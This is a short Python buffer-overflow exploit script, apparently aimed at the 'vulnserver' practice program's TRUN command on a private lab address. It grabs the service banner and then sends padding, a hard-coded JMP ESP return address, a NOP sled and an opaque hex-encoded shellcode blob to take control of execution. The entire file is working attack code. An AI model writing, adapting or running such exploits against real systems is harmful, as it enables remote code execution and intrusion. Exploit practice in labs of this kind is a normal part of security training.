#!/usr/bin/python3

import socket
import struct
import binascii

host = "192.168.0.101"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

#banner grabbing
print("[*] Grabbing Banner")

banner = s.recv(1024)

print(banner.decode())

#generate bad characters \x01 - \xff
#badchar = \x00
badchar = ''

for x in range(1, 256):
	badchar += '{:02x}'.format(x)


#Exploit payloads properties
command = b"TRUN /.:/"
padding = b"A"*2003
jmpESP = struct.pack('<I', 0x625011af)
eip = jmpESP
nop_sled = b"\x90"*16
shellcode = "bb84257b35dac5d97424f45833c9b15231581283e8fc03dc2b99c020dbdf2bd81c80a23d2d80d1361e30911a93bbf78e20c9dfa18164068c12d47a8f9027af6fa8e7a26eed1a4e22a651fdd2c32c3e599fa146be68c36711e29aa7902797e18a2492b8219e683be3ee9190cade63e80bd89b9f651a2198b260fd2d20c276958cf25b4047f810060f1da6cb241923eaeaab77c92ef72c70775d828d673e7b28ecd36841afbb5d684f3ccafb3c0e5550aa221e7e2d4435c6a1bbb637e87fe26782568be352565ea302f83104f2b8e1ec1837dd0d239d76a7de76b990e03551e3e070686a06e87c3b9185e5666937e9bc14776133e936823ef9af6275a3667ca3cbe5ef280b630ce75c24e2fe08d85da92e213b92eafef81df373443ae34d4506570210d001e4ca92fbbea17c6b468abeed47c74811f9be0c2e365799572ac76682eef72c8e4790e85bdafd0ab619f88832e2ff9137e74416a495d5f3ca0ad5d1"
junk = b"B"*(984 - len(nop_sled) - len(shellcode))


payload = b"".join([
	command,
	padding,
	eip,
	nop_sled,
	binascii.a2b_hex(shellcode),
	junk
])

print("[*] Sending Payload")
s.send(payload)
print("[*] Payload Send Successful.")

s.close()
